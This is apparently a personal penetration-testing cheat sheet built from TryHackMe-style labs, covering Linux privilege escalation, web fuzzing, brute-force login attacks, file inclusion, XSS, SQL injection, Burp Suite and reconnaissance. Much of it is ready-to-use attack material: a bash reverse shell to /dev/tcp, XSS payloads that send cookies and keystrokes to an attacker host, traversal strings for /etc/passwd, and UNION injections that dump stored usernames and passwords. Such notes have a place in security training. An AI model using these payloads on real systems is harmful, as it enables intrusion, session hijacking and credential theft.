# Useful-git-links

## Priviledge escalation Linux:
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS <br>
LinEnum: https://github.com/rebootuser/LinEnum<br>
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester<br>
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration<br>
Linux Priv Checker: https://github.com/linted/linuxprivchecker<br>

Linux vuln exploit: https://gtfobins.github.io/

# Useful commands

## Priviledge escalation Linux:
Exploit for every sudo app for the user: ```sudo -l``` <br>
Reverse shell command:  ```bash -i >& /dev/tcp/"ip"/"port" 0>&1```<br>
Find SUID bit: ```find / -type f -perm -04000 -ls 2>/dev/null```<br>
Find capabilities: ``getcap -r / 2>/dev/null`` <br>

### NFS
Find if there is NFS on : `cat /etc/exports`  (Need "no_root_squash" option on shared folder)
On another machine: 

    showmount -e "ip"
    mkdir /tmp/attackerbackup
    mount -o rw "ip":/"shared_folder" /tmp/attackerbackup
    Then add a new program that launch a shell and compile it, run it on the victim machine

## Content discovery web
Wordlist pour TOUT: https://github.com/danielmiessler/SecLists/tree/master
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

    ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.28.209/FUZZ

    dirb http://10.10.28.209/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

    gobuster dir --url http://10.10.28.209/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

## Subdomain discovery

DNS Bruteforce:

    dnsrecon -t brt -d <domain>
Automated tool: https://github.com/aboul3la/Sublist3r

    ./sublist3r.py -d <domain>
Virtual hosts: 

    ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
## Username discovery
Fuzzing github: https://github.com/ffuf/ffuf

    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.11/customers/signup -mr "username already exists" 
    
-w: wordlist, -X: request method, -d:data, -H: Extra headers, -u: URL, -mr: success text to find in the page if username already used 

## Authentication bypass

    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.11/customers/login -fc 200

-w: wordlist (:W1 = username, :W2 = passwords), -fc: check for HTTP Status Code to filter (in this case, filter 200)

## Hash craking
https://crackstation.net/

## File Inclusion
Files to aim which a Directory Traversal
![image info](Useful_files_from_Linux_fs.png)

    /etc/passwd
    ../../../../etc/passwd
    ../../../../etc/passwd%00
    ....//....//....//....//etc/passwd (Filter that replace ../ by empty string)
    <forced directory>../../../../etc/passwd (When a directory is forced, include it)

## SSRF
Bypass starting URL constraints (cannot start by /private) : x/../private

## XSS
Session Stealing:

    </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>

Key Logger:

    <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

Business Logic:

    <script>user.changeEmail('attacker@hacker.thm');</script>

Some payloads :

    <script>alert('THM');</script>
    "><script>alert('THM');</script> (when the input is inside a tag <>)
    </textarea><script>alert('THM');</script> (when input is between <textarea> tags)
    ';alert('THM');// (when js get the input with  document.getElementsByClassName('name')[0].innerHTML='Adam')
    <sscriptcript>alert('THM');</sscriptcript> (when "script" is filtered)
    onload="alert('THM'); (when inside an image tag and "<" ">" are filtered
    

Polyglot (c'est OP)

    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-       -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

## Command Injection 
https://github.com/payloadbox/command-injection-payload-list

Use ";" to chain syscall.

## SQL Injection

### In-Band SQLi

First we have to check how many columns there are to select : select 1 -> select 1,2 -> select 1,2,3 ....

    0 UNION SELECT 1,2,database()  (database() returns the name of the database) 

Once we know the name of the database, we get the tables of the database

    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<database name>'

Then get the colums name of the table we're interested in

    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '<table name>'

Then display the content: 

    0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users (where 'username' and 'password' are column names)

### Blind SQLi (the thing before union must be false so that we can check that our query works or not)

#### Authentication bypass 

    ' OR 1=1;--
#### Boolean based

    admin123' UNION SELECT 1,2,3 where database() like '%';-- (discover the name on a boolean base database, add character before % and see if the database returns true or not)
#### Time based

    admin123' UNION SELECT SLEEP(5);--  

# Burp suite

## Intruder

### Attack types

#### Sniper
One set of payloads, if multiple positions, will do one at a time

#### Battering ram
One set of payloads, if multiple positions, will do all at once (same one not alternating)

#### Pitchfork
One set of payloads per position, first with first ect... 

#### Cluster Bomb
One set of payloads per position, every single combination possible

## Macro
Use when we want to get session cookie or loginToken that is generated each time you enter a login page
![](https://assets.muirlandoracle.co.uk/thm/modules/burp/creatingMacro.gif)
![](https://assets.muirlandoracle.co.uk/thm/modules/burp/configuringSessionHandlerP1.gif)
![](https://assets.muirlandoracle.co.uk/thm/modules/burp/addingRuleAction.gif)

## Sequencer
Used to measure the entropy of "tokens" (session, login ...) 

## Extender: 

Add extensions such as:
### IP Rotate: Use AWS to send requests to a website (to bypass IP restrictions)
### Request Timer: Time the response time to detect timing attack

# Passive Reconnaissance
Info on the domain name

    whois <DOMAIN_NAME>
Get IP adresses of a domain

    nslookup <DOMAIN_NAME>
    nslookup <OPTIONS> <DOMAIN_NAME> <SERVER> (OPTION: A for IPv4, AAAA for IPv6) (SERVER: DNS server)
    
DNS Record Types

DNS isn't just for websites though, and multiple types of DNS record exist. We'll go over some of the most common ones that you're likely to come across.

A Record

These records resolve to IPv4 addresses, for example 104.26.10.229

AAAA Record

These records resolve to IPv6 addresses, for example 2606:4700:20::681a:be5

CNAME Record

These records resolve to another domain name, for example, TryHackMe's online shop has the subdomain name store.tryhackme.com which returns a CNAME record shops.shopify.com. Another DNS request would then be made to shops.shopify.com to work out the IP address.

MX Record

These records resolve to the address of the servers that handle the email for the domain you are querying, for example an MX record response for tryhackme.com would look something like alt1.aspmx.l.google.com. These records also come with a priority flag. This tells the client in which order to try the servers, this is perfect for if the main server goes down and email needs to be sent to a backup server.

TXT Record

TXT records are free text fields where any text-based data can be stored. TXT records have multiple uses, but some common ones can be to list servers that have the authority to send an email on behalf of the domain (this can help in the battle against spam and spoofed email). They can also be used to verify ownership of the domain name when signing up for third party services.

# Active reconnaissance
Ping to know if the system is up and accept pings ?

    ping <domain>
Trace the route between us and the target:

    traceroute <domain>
Connect to the Telnet (port 23) program:

    telnet <ip> <port>
Connect to the webserver with Netcat:

    nc <ip> <port>

    

